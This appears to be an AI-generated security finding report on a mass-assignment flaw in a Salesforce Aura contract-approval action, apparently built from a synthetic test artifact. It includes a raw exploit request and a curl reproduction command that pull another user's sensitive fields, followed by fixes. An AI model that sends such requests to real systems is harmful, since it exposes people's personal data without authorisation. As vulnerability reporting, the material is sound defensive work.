# Security Analysis Report
**System:** StayPro Property API (Hospitality / Hotel PMS) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0030 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.12 | Mass assignment via object fields — `ContractController.approveContract` returns client-specified fields without ownership check |

---

## Finding 1 — Mass Assignment: Client-Controlled Fields in Contract Approval Action (CRITICAL)

### Summary
The `ContractController` Apex class on StayPro Property API (`5b594589.lightning.force.com`) is declared `without sharing`. The `approveContract` Aura action accepts a client-supplied `fields` array and `contractId` without ownership validation. Per §5.0 Pattern 1.12, this is mass assignment via object fields: the attacker controls which Contract fields are returned, and can request sensitive fields (`SensitiveData__c`, `InternalNotes__c`) beyond what the approval function normally needs. The combination of a `without sharing` write action with client-controlled field selection is a high-severity mass assignment vector.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.ContractController.approveContract`
**Affected endpoint:** `POST https://5b594589.lightning.force.com/aura`

### Evidence from HAR
**Request:**
```
POST https://5b594589.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D5B594589!AR5b594589...
message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","params":{"contractId":"0014589","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response:** `Id: 0014589`, `OwnerId: 005VICTIM`, `SensitiveData__c: SSN: 000-91-7624`

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD bypassed |
| §5.0 Pattern 1.12 | Vulnerability | Client-controlled `fields` on write action | Mass assignment |
| HAR descriptor | `c.ContractController.approveContract` | Aura action | Write action exploited for read |
| HAR params | `contractId` | `0014589` | Victim hotel contract |
| HAR params | `fields` | `["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]` | Client-controlled field selection |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-91-7624` | Hotel guest PII |

### Steps to Reproduce
```bash
curl -s -X POST "https://5b594589.lightning.force.com/aura" \
  -H "Authorization: Bearer 00D5B594589!AR5b594589..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN","params":{"contractId":"0014589","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```

### Remediation
1. `public with sharing class ContractController {`
2. `WHERE Id = :contractId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields` parameter; define server-side allowlist for contract approval (only status fields needed).
4. Validate `aura.token`. Hospitality/hotel contracts contain rate agreements and PII.
